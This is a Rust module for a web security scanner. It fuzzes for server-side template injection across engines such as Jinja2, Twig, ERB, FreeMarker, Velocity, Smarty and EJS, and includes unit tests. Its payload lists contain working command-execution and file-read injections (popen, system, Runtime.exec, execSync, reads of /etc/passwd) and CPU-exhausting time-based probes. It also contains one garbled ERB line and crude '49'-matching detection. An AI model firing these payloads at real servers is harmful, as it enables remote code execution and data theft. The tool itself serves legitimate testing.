use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
use reqwest::Client;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    ERB,
    FreeMarker,
    Velocity,
    Smarty,
    Handlebars,
    Mako,
    Cheetah,
    DotNet,
    Jade,
    EJS,
    Underscore,
    Phusion,
}

impl std::fmt::Display for TemplateEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TemplateEngine::Jinja2 => write!(f, "Jinja2 (Python)"),
            TemplateEngine::Twig => write!(f, "Twig (PHP)"),
            TemplateEngine::ERB => write!(f, "ERB (Ruby)"),
            TemplateEngine::FreeMarker => write!(f, "FreeMarker (Java)"),
            TemplateEngine::Velocity => write!(f, "Velocity (Java)"),
            TemplateEngine::Smarty => write!(f, "Smarty (PHP)"),
            TemplateEngine::Handlebars => write!(f, "Handlebars (JS)"),
            TemplateEngine::Mako => write!(f, "Mako (Python)"),
            TemplateEngine::Cheetah => write!(f, "Cheetah (Python)"),
            TemplateEngine::DotNet => write!(f, "ASP.NET Razor"),
            TemplateEngine::Jade => write!(f, "Jade/Pug"),
            TemplateEngine::EJS => write!(f, "EJS"),
            TemplateEngine::Underscore => write!(f, "Underscore.js"),
            TemplateEngine::Phusion => write!(f, "Phusion Passenger"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SstiTestResult {
    pub engine: TemplateEngine,
    pub success: bool,
    pub payload: String,
    pub output_snippet: String,
    pub severity: Severity,
    pub description: String,
}

pub struct SstiFuzzer {
    pub test_strings: Vec<&'static str>,
    pub target_url: Option<String>,
    pub param_name: Option<String>,
    pub client: Option<Client>,
}

impl Default for SstiFuzzer {
    fn default() -> Self {
        Self::new()
    }
}

impl SstiFuzzer {
    pub fn new() -> Self {
        Self {
            test_strings: vec![
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "#{T(java.lang.Math).floor(7.5)}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request}}",
                "{{self}}",
            ],
            target_url: None,
            param_name: None,
            client: None,
        }
    }

    pub fn generate_payloads(&self) -> Vec<SstiTestResult> {
        let mut results = Vec::new();

        for (engine, payloads) in self.get_engine_payloads() {
            for payload in payloads {
                results.push(SstiTestResult {
                    engine,
                    success: false,
                    payload: payload.to_string(),
                    output_snippet: String::new(),
                    severity: Severity::Critical,
                    description: format!("Testing {} with payload", engine),
                });
            }
        }

        results
    }

    fn get_engine_payloads(&self) -> Vec<(TemplateEngine, Vec<&'static str>)> {
        vec![
            (TemplateEngine::Jinja2, vec![
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{request}}",
                "{{self}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{request.application.__globals__.__import__('os').popen('id').read()}}",
                "{% for x in ().__class__.__base__.__subclasses__() %}{{x()}}{% endfor %}",
                "{{url_for.__globals__.os.popen('id').read()}}",
                "{{get_flashed_messages.__globals__}}",
                "{{session.__dict__}}",
                "{{g.__dict__}}",
                "{{current_app.__dict__}}",
                "{{namespace|join(',')}}",
            ]),
            (TemplateEngine::Twig, vec![
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{app}}",
                "{{_self}}",
                "{{_context}}",
                "{{source('/etc/passwd')}}",
                "{{_self.env.cache}}",
                "{{_self.env.include('file:///etc/passwd')}}",
                "{{['id']|map('system')|join}}",
                "{{['cat /etc/passwd']|filter('system')}}",
            ]),
            (TemplateEngine::ERB, vec![
                "<%= 7*7 %>",
                "<%= system('id') %>",
                "<%= `id` %>",
                "<%= File.read('/etc/passwd') %>",
                "<%= Dir.entries('/') %>",
                "<%= ENV.keys %>",
                "<%= `ls` %>",
                "<%= IO.popen('id').read %>",
                "<%= Ruby's رش/'uname -a' %>",
            ]),
            (TemplateEngine::FreeMarker, vec![
                "${7*7}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd')}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
                "${freemarker.template.utility.Execute.exec(\"id\")}",
                "${ssti}",
                "${7777777?c}",
            ]),
            (TemplateEngine::Velocity, vec![
                "#set($x = '')${x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
                "#set($x = 7*7)${x}",
                "$util.include(\"file:///etc/passwd\")",
                "#springBind(\"${ssti}\")",
                "${ssti}",
            ]),
            (TemplateEngine::Smarty, vec![
                "{7*7}",
                "{php}system('id');{/php}",
                "{$smarty.version}",
                "{self::getStream('file:///etc/passwd')}",
                "{php}echo `id`;{/php}",
                "{$smarty.const._FILE_}",
            ]),
            (TemplateEngine::Handlebars, vec![
                "{{7*7}}",
                "{{#with (lookup . \"__proto__\")}}{{/with}}",
                "{{#each (json_parse \"{}\")}}{{/each}}",
                "{{#if (equals 1 1)}}test{{/if}}",
            ]),
            (TemplateEngine::Mako, vec![
                "${7*7}",
                "${self.module.cache.import('os').popen('id').read()}",
                "${request.app.__class__.__name__}",
                "<% import os %>${os.popen('id').read()}",
            ]),
            (TemplateEngine::DotNet, vec![
                "@(7*7)",
                "@{ new System.Diagnostics.Process { StartInfo = new System.Diagnostics.ProcessStartInfo { FileName = \"cmd\", Arguments = \"/c id\" } }.Start() }",
                "@(Request.ApplicationPath)",
                "${T(System.Diagnostics.Process).Start(\"cmd\", \"/c id\")}",
            ]),
            (TemplateEngine::Jade, vec![
                "!= 7*7",
                "- var x = 7*7\n| #{x}",
                "include /etc/passwd",
                "- require('child_process').execSync('id')",
            ]),
            (TemplateEngine::EJS, vec![
                "<%= 7*7 %>",
                "<%= global.process.mainModule.require('child_process').execSync('id') %>",
                "<%= typeof process %>",
                "<%= JSON.stringify(global) %>",
            ]),
        ]
    }

    pub fn detect_from_response(&self, response: &str) -> Option<TemplateEngine> {
        let _response_lower = response.to_lowercase();

        if response.contains("49") || response.contains("7*7") {
            return Some(TemplateEngine::Jinja2);
        }
        if response.contains("__class__") || response.contains("__mro__") {
            return Some(TemplateEngine::Jinja2);
        }
        if response.contains("__templates__") || response.contains("_smarty") {
            return Some(TemplateEngine::Smarty);
        }
        if response.contains("freemarker") || response.contains("freemarker.template") {
            return Some(TemplateEngine::FreeMarker);
        }
        if response.contains("erb") || response.contains(".erb") {
            return Some(TemplateEngine::ERB);
        }

        None
    }

    pub fn with_target_url(mut self, url: String) -> Self {
        self.target_url = Some(url);
        self
    }

    pub fn with_param_name(mut self, param: String) -> Self {
        self.param_name = Some(param);
        self
    }

    pub fn with_client(mut self, client: Client) -> Self {
        self.client = Some(client);
        self
    }

    pub async fn test_ssti_on_server(&mut self) -> Vec<SstiTestResult> {
        let mut results = Vec::new();

        let client = match &self.client {
            Some(c) => c,
            None => return results,
        };

        let target_url = match &self.target_url {
            Some(url) => url,
            None => return results,
        };

        let param = self
            .param_name
            .clone()
            .unwrap_or_else(|| "name".to_string());

        let blind_payloads = vec![
            ("{{7*7}}", "Jinja2/Twig", TemplateEngine::Jinja2),
            ("{{7*'7'}}", "Jinja2", TemplateEngine::Jinja2),
            ("<%= 7*7 %>", "ERB/EJS", TemplateEngine::ERB),
            ("${7*7}", "FreeMarker/Velocity", TemplateEngine::FreeMarker),
            ("#{7*7}", "Ruby", TemplateEngine::ERB),
            ("{{{.}}}", "Handlebars", TemplateEngine::Handlebars),
            ("{{#with \"\"}}{{#with \"\"}}{{#with \"\"}}{{#with \"\"}}{{#with \"\"}}{{#with \"\"}}{{#with \"\"}}", "Handlebars depth", TemplateEngine::Handlebars),
            ("*7*7*", "Smarty", TemplateEngine::Smarty),
        ];

        for (payload, desc, engine) in blind_payloads {
            let url = format!("{}?{}={}", target_url, param, urlencoding::encode(payload));

            let response = client.get(&url).send().await;

            match response {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();

                    let is_vulnerable = body.contains("49")
                        || body.contains("49.0")
                        || body.contains("7777777")
                        || body.contains(payload);

                    if is_vulnerable {
                        results.push(SstiTestResult {
                            engine,
                            success: true,
                            payload: payload.to_string(),
                            output_snippet: body.chars().take(200).collect(),
                            severity: Severity::Critical,
                            description: format!("SSTI detected! {} - payload executed", desc),
                        });
                    } else if status == 500 {
                        results.push(SstiTestResult {
                            engine,
                            success: false,
                            payload: payload.to_string(),
                            output_snippet: body.chars().take(200).collect(),
                            severity: Severity::High,
                            description: format!(
                                "Server error (500) - possible {} injection",
                                desc
                            ),
                        });
                    }
                }
                Err(_) => continue,
            }
        }

        let time_based_payloads = vec![
            (
                "{{range(\"\"|int|list,1,500000000)}}a{{end}}",
                "Jinja2",
                TemplateEngine::Jinja2,
            ),
            ("{{sleep(5)}}", "Twig", TemplateEngine::Twig),
        ];

        for (payload, desc, engine) in time_based_payloads {
            let url = format!("{}?{}={}", target_url, param, urlencoding::encode(payload));
            let start = std::time::Instant::now();

            let _response = client.get(&url).send().await;
            let elapsed = start.elapsed().as_millis() as u64;

            if elapsed > 4000 {
                results.push(SstiTestResult {
                    engine,
                    success: true,
                    payload: payload.to_string(),
                    output_snippet: format!("Response time: {}ms", elapsed),
                    severity: Severity::Critical,
                    description: format!(
                        "Time-based SSTI detected! {} - {}ms delay",
                        desc, elapsed
                    ),
                });
            }
        }

        results
    }
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let ssti_payloads = vec![
        (
            "{{7*7}}",
            "Jinja2 - basic math",
            TemplateEngine::Jinja2,
            Severity::High,
        ),
        (
            "{{config}}",
            "Jinja2 - config leak",
            TemplateEngine::Jinja2,
            Severity::Critical,
        ),
        (
            "<%= 7*7 %>",
            "ERB - basic math",
            TemplateEngine::ERB,
            Severity::High,
        ),
        (
            "<%= system('id') %>",
            "ERB - command execution",
            TemplateEngine::ERB,
            Severity::Critical,
        ),
        (
            "${7*7}",
            "FreeMarker - basic math",
            TemplateEngine::FreeMarker,
            Severity::High,
        ),
        (
            "{7*7}",
            "Smarty - basic math",
            TemplateEngine::Smarty,
            Severity::High,
        ),
        (
            "{{7*7}}",
            "Handlebars - basic math",
            TemplateEngine::Handlebars,
            Severity::High,
        ),
        (
            "${7*7}",
            "Mako - basic math",
            TemplateEngine::Mako,
            Severity::High,
        ),
        (
            "@(7*7)",
            "Razor - basic math",
            TemplateEngine::DotNet,
            Severity::High,
        ),
        (
            "!= 7*7",
            "Jade/Pug - basic math",
            TemplateEngine::Jade,
            Severity::High,
        ),
    ];

    for (payload, desc, engine, severity) in ssti_payloads {
        payloads.push(Payload {
            payload_type: PayloadType::Ssti,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["ssti".to_string(), format!("{:?}", engine).to_lowercase()],
        });
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "SSTI payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_ssti_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Ssti);
        }
    }

    #[test]
    fn contains_jinja2_syntax() {
        let payloads = get_payloads();
        let has_jinja = payloads
            .iter()
            .any(|p| p.payload.contains("{{7*7}}") || p.payload.contains("{{config}}"));
        assert!(has_jinja, "Must contain Jinja2 {{}} syntax");
    }

    #[test]
    fn contains_erb_syntax() {
        let payloads = get_payloads();
        let has_erb = payloads.iter().any(|p| p.payload.contains("<%="));
        assert!(has_erb, "Must contain ERB <%= %> syntax");
    }

    #[test]
    fn contains_freemarker_syntax() {
        let payloads = get_payloads();
        let has_fm = payloads.iter().any(|p| p.payload.contains("${7*7}"));
        assert!(has_fm, "Must contain FreeMarker ${{}} syntax");
    }

    #[test]
    fn contains_command_execution_payloads() {
        let payloads = get_payloads();
        let has_exec = payloads.iter().any(|p| {
            p.payload.contains("system(")
                || p.payload.contains("popen")
                || p.payload.contains("exec(")
        });
        assert!(has_exec, "Must contain template command execution payloads");
    }

    #[test]
    fn config_leak_is_critical() {
        let payloads = get_payloads();
        let config: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.payload.contains("{{config}}"))
            .collect();
        assert!(!config.is_empty(), "Must have config leak payload");
        for p in config {
            assert_eq!(
                p.severity,
                Severity::Critical,
                "Config leak payloads must be Critical"
            );
        }
    }

    #[test]
    fn ssti_fuzzer_has_test_strings() {
        let fuzzer = SstiFuzzer::new();
        assert!(
            !fuzzer.test_strings.is_empty(),
            "SstiFuzzer must have test strings"
        );
        assert!(
            fuzzer.test_strings.iter().any(|s| s.contains("7*7")),
            "Must test arithmetic evaluation"
        );
    }

    #[test]
    fn ssti_fuzzer_generates_engine_payloads() {
        let fuzzer = SstiFuzzer::new();
        let results = fuzzer.generate_payloads();
        assert!(!results.is_empty(), "generate_payloads must return results");
        assert!(
            results.iter().any(|r| r.engine == TemplateEngine::Jinja2),
            "Must cover Jinja2"
        );
        assert!(
            results.iter().any(|r| r.engine == TemplateEngine::ERB),
            "Must cover ERB"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 8,
            "Must have SSTI coverage across engines, got {}",
            payloads.len()
        );
    }
}
